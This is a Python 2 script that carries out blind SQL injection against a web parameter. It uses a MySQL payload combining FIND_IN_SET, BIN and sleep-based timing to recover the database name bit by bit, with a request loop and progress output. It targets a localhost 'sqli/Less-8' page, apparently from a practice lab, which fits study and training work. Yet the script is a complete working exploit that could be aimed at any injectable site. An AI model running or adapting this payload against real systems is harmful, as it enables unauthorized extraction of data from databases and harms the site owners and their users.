#!/usr/bin/python

import httplib
import sys
import threading
import time
import urlparse
import urllib
from collections import OrderedDict
from os import _exit,system


def connect(host,port,verb,path,query,data=None,headers={}):
	path = path +'?'+ urllib.urlencode(query)
	h = httplib.HTTPConnection(host,int(port))
	h.request("GET",path,"",{})
	return h.getresponse().read()

def request(url):
	parser = urlparse.urlparse(url)
	request.host = parser.netloc.split(':')[0]
	request.port = 80 if 'http' in parser.scheme else parser.netloc.split(':')[1]
	request.query = OrderedDict(urlparse.parse_qsl(parser.query))
	request.path = parser.path
	return request
	
def inject(url,vuln_param=None,prefix=None,suffix=None,verb=None):

	parser = request(url)
	verb = verb if verb else "GET"
	tc = 'You are in...........';
	rc = 0
	
	# Takes some time, less than 6 RPC
	# 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
	
	char_set = [48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,58,59,60,61,62,63,64,91,92,93,94,95,96,123,124,125,126,32,9,10,13,11,12]
	
	# Fastest set for retrieving alphanumeric data in min 6 RPC
	# !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
	
	# char_set = [33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126]

	
		
	val = ""
	
	for x in range(1,9):
		b = '1'
		for y in range(2,8):
			payload = " 1' AND ((SELECT @a:=MID(BIN(FIND_IN_SET(ascii(MID((select database()),%d,1)),'48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,58,59,60,61,62,63,64,91,92,93,94,95,96,123,124,125,126,32,9,10,13,11,12')),%d,1))=@a) AND (IF(@a!='',@a,sleep(1))) AND '1'= '1" %(x,y)
			
			if vuln_param in parser.query.keys():
				parser.query[vuln_param] =  payload
			else:
				_exit(1)
			st = time.time()
			rc += 1
			response = connect(parser.host,parser.port,verb,parser.path,parser.query)
			et = int(time.time() - st)
			if et >= 1:
				break
			else:
				if tc in response:
					b += '1'
				else:
					b += '0'
		# system('cls')
		print b
		val += chr(char_set[int(b,2) - 1])	
		print "Database Name : {0}".format(val),
		sys.stdout.flush()
	print "\n[+] No of requests %d" %rc

	
				

inject("http://localhost/sqli/Less-8/index.php?id=1",vuln_param="id")